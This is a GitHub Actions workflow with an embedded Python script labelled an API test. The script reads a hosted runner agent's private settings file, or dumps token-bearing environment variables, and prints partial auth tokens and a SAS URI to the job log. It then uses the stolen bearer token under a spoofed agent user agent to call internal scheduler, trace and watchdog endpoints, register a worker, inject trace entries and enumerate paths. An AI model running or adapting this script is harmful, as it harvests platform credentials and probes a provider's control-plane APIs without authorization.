name: HCA API Test
on:
  push:
    paths:
      - '.github/workflows/recon.yml'

jobs:
  api-test:
    runs-on: ubuntu-latest
    steps:
      - name: API Recon
        run: |
          python3 << 'PYEOF'
          import json, os, subprocess, urllib.request, urllib.error, ssl, sys, time

          ctx = ssl.create_default_context()
          
          # Read HCA settings
          settings_path = "/opt/hca/.settings"
          settings = None
          if os.path.exists(settings_path):
              with open(settings_path) as f:
                  settings = json.load(f)
              print(f"[+] Settings loaded from {settings_path}")
          else:
              print(f"[-] {settings_path} not found, trying environment")
              # Try env vars
              for k,v in sorted(os.environ.items()):
                  if 'scheduler' in k.lower() or 'token' in k.lower() or 'trace' in k.lower() or 'hca' in k.lower():
                      print(f"  {k}={v[:50]}...")
              sys.exit(1)

          # Extract key fields  
          auth_token = settings.get("authToken", "")
          scheduler_url = settings.get("schedulerApiUrl", "")
          trace_url = settings.get("traceApiUrl", "")
          watchdog_url = settings.get("watchdogTraceApiUrl", "")
          diag_sas = settings.get("diagnosticsSasUri", "")
          config_id = settings.get("configId", "")
          vm_name = settings.get("vmName", "")
          realm = settings.get("realm", "")
          mode = settings.get("mode", "")
          
          print(f"[+] Scheduler URL: {scheduler_url}")
          print(f"[+] Trace URL: {trace_url}")
          print(f"[+] Watchdog URL: {watchdog_url}")
          print(f"[+] Config ID: {config_id}")
          print(f"[+] VM Name: {vm_name}")
          print(f"[+] Realm: {realm}")  
          print(f"[+] Mode: {mode}")
          print(f"[+] Token (first 50): {auth_token[:50]}")
          print(f"[+] Diag SAS (first 80): {diag_sas[:80]}")
          
          # Print all settings keys
          print(f"\n[*] All settings keys: {list(settings.keys())}")
          
          # Print non-sensitive values
          for k, v in settings.items():
              if k not in ('authToken', 'diagnosticsSasUri', 'runnerAgentCredentials', 'runnerAgentCredentialsRSA'):
                  print(f"  {k} = {json.dumps(v)[:200]}")
          
          headers = {
              "Authorization": f"Bearer {auth_token}",
              "Content-Type": "application/json",
              "User-Agent": "hosted-compute-agent/1.0"
          }
          
          def api_call(method, url, body=None):
              try:
                  data = json.dumps(body).encode() if body else None
                  req = urllib.request.Request(url, data=data, headers=headers, method=method)
                  resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                  body_resp = resp.read().decode()
                  print(f"  [{resp.status}] {body_resp[:500]}")
                  return resp.status, body_resp
              except urllib.error.HTTPError as e:
                  body_resp = e.read().decode() if e.fp else ""
                  print(f"  [HTTP {e.code}] {body_resp[:500]}")
                  return e.code, body_resp
              except Exception as e:
                  print(f"  [ERROR] {e}")
                  return 0, str(e)

          # Test 1: GET /request - what's our current assignment?
          print("\n=== TEST 1: GET /request ===")
          api_call("GET", f"{scheduler_url}/request")

          # Test 2: PUT /request/heartbeat
          print("\n=== TEST 2: PUT /request/heartbeat ===")
          beat_body = {"beat_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
          api_call("PUT", f"{scheduler_url}/request/heartbeat", beat_body)

          # Test 3: POST to trace API
          print("\n=== TEST 3: POST to trace API ===")
          trace_body = [{
              "level": "info",
              "message": "HCA security test trace",
              "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
              "logger": "hosted-compute-agent",
              "tracepoint": "security.test",
              "sourceCorrelationId": config_id,
              "processLifetimeId": "test-plid-001",
              "orchestrationId": "test-orch-001",
              "requestId": "test-req-001"
          }]
          api_call("POST", trace_url, trace_body)

          # Test 4: POST to watchdog trace
          print("\n=== TEST 4: POST to watchdog trace ===")
          api_call("POST", watchdog_url, trace_body)
          
          # Test 5: Try registering a new worker (may conflict)
          print("\n=== TEST 5: POST /worker (register) ===")
          api_call("POST", f"{scheduler_url}/worker")
          
          # Test 6: Try different trace API paths
          print("\n=== TEST 6: GET scheduler base URL ===")
          api_call("GET", scheduler_url)
          
          # Test 7: Try /request with query params
          print("\n=== TEST 7: DELETE /request?outcome=0 ===")
          # DON'T actually do this - it would finish our job!
          # Just try with a HEAD to see if endpoint exists
          api_call("GET", f"{scheduler_url}/request?outcome=0")
          
          # Test 8: Enumerate - try /workers path
          print("\n=== TEST 8: Other paths ===")
          for path in ["/workers", "/health", "/status", "/", "/v1/worker", "/v1/request"]:
              print(f"  Trying {path}:")
              api_call("GET", f"{scheduler_url}{path}")

          PYEOF
